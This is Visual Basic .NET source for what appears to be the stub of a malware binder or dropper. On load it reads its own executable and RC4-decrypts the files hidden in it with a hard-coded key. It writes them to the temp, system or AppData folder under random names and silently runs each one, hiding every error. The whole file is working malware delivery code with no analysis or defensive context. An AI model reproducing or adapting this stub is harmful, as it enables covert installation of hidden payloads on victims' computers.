Imports System.Text
Public Class Form1
    Const Splitter As String = "@#sp@##@s@lit#mixed"
    Const enckey = "Yod2ff86sd84f8r84bj84d3fgh68sdh6"
    Dim Stub, Data(), dropping As String
    Dim num As Integer
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        Stub = Space(LOF(1))
        FileGet(1, Stub)
        FileClose(1)
        Data = Split(Stub, Splitter)
        num = Val(rc4(Data(1), enckey))
        Select Case Data(2)
            Case rc4("TEMP", enckey)
                dropping = My.Computer.FileSystem.SpecialDirectories.Temp + "\"
            Case rc4("SYSTEM", enckey)
                dropping = Environment.SystemDirectory + "\"
            Case rc4("APPDATA", enckey)
                dropping = Environment.GetEnvironmentVariable("APPDATA") + "\"
        End Select
        For i = 3 To num + 2
            Try
                Dim filled() As String
                filled = Split(Data(i), "#EXT#@is@here##")
                Dim tpth As String = dropping + Number(10000, 99999) + rc4(filled(1), enckey)
                FileOpen(i, tpth, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(i, rc4(filled(0), enckey))
                FileClose(i)
                Process.Start(tpth)
            Catch
            End Try
        Next
        End
    End Sub
    Public Shared Function rc4(ByVal message As String, ByVal password As String) As String

        Dim i As Integer = 0
        Dim j As Integer = 0
        Dim cipher As New StringBuilder
        Dim returnCipher As String = String.Empty

        Dim sbox As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}

        Dim intLength As Integer = password.Length

        Dim a As Integer = 0
        While a <= 255

            Dim ctmp As Char = (password.Substring((a Mod intLength), 1).ToCharArray()(0))

            key(a) = Microsoft.VisualBasic.Strings.Asc(ctmp)
            sbox(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While

        Dim x As Integer = 0

        Dim b As Integer = 0
        While b <= 255
            x = (x + sbox(b) + key(b)) Mod 256
            Dim tempSwap As Integer = sbox(b)
            sbox(b) = sbox(x)
            sbox(x) = tempSwap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While

        a = 1

        While a <= message.Length

            Dim itmp As Integer = 0

            i = (i + 1) Mod 256
            j = (j + sbox(i)) Mod 256
            itmp = sbox(i)
            sbox(i) = sbox(j)
            sbox(j) = itmp

            Dim k As Integer = sbox((sbox(i) + sbox(j)) Mod 256)

            Dim ctmp As Char = message.Substring(a - 1, 1).ToCharArray()(0)

            itmp = Asc(ctmp)

            Dim cipherby As Integer = itmp Xor k

            cipher.Append(Chr(cipherby))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While

        returnCipher = cipher.ToString
        cipher.Length = 0

        Return returnCipher

    End Function
    Private Function GetBetween(ByRef strSource As String, ByRef strStart As String, ByRef strEnd As String, _
                          Optional ByRef startPos As Integer = 0) As String
        Dim iPos As Integer, iEnd As Integer, lenStart As Integer = strStart.Length
        Dim strResult As String

        strResult = String.Empty
        iPos = strSource.IndexOf(strStart, startPos)
        iEnd = strSource.IndexOf(strEnd, iPos + lenStart)
        If iPos <> -1 AndAlso iEnd <> -1 Then
            strResult = strSource.Substring(iPos + lenStart, iEnd - (iPos + lenStart))
        End If
        Return strResult
    End Function
    Private Function Number(ByVal min As Integer, ByVal max As Integer) As String
        Dim random As New Random()
        Return random.Next(min, max).ToString
    End Function
End Class
